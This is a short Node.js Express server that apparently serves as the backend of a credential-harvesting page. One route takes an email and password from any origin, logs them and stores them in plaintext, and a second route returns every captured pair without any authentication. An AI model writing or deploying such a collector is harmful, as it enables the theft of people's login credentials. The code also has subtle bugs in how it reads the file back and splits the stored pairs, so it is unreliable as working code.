const app = require('express')()
const fs = require('fs')
const append = (email, password) => new Promise((resolve) => {
  if (!fs.existsSync('data/pairs.txt')) {
    fs.writeFile('data/pairs.txt', `${email}:${password}`, resolve)
  } else {
    fs.appendFile('data/pairs.txt', `\n${email}:${password}`, resolve)
  }
})
const getPairs = () => new Promise((resolve) => {
  if (!fs.existsSync('data/pairs.txt')) {
    resolve('')
  } else {
    fs.readFile('data/pairs.txt', (data) => resolve(data.toString()))
  }
})
app.get('/backend/:email/:password', async (req, res) => {
  console.log(`> Email: '${req.params.email}'`)
  console.log(`> Password: '${req.params.password}'`)
  await append(req.params.email, req.params.password)
  res.header('Access-Control-Allow-Origin', '*')
  res.end()
})
app.get('/backend/pairs', async (req, res) => {
  const pairs = await getPairs()
  const json = pairs.split('').map((pair) => {
    const split = pair.split(':')
    return {
      email: split[0],
      password: split[1]
    }
  })
  res.header('Access-Control-Allow-Origin', '*')
  res.json(json)
})
app.listen(3001, () => console.log('> Ready on port 3001'))